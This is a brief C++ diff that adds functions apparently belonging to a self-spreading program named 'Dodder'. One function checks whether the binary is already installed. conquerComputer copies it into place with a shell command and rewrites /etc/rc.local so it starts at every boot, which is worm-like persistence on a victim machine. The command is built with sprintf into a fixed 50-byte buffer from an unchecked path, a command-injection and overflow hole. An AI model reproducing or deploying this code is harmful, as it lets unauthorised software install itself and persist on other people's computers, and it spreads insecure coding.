@@ -139,3 +139,25 @@ const bool processAlreadyRunning(void)
     return false;
 
 }
+
+const bool checkForConquer(void)
+{
+    FILE *p = fopen("/usr/sbin/Dodder", "rb");
+    if(p == nullptr)
+        return false;
+    fclose(p);
+    return true;
+}
+
+void conquerComputer(const char *path)
+{
+    std::string Path(path);
+    char command[50];
+    sprintf(command, "cp Dodder %s", path);
+    system(command);
+    FILE *p = fopen("/etc/rc.local", "r+");
+    fseek(p, -7, SEEK_END);
+    fputs("/usr/sbin/Dodder\nexit 0", p);
+    std::cout << "OK" << std::endl;
+}
+
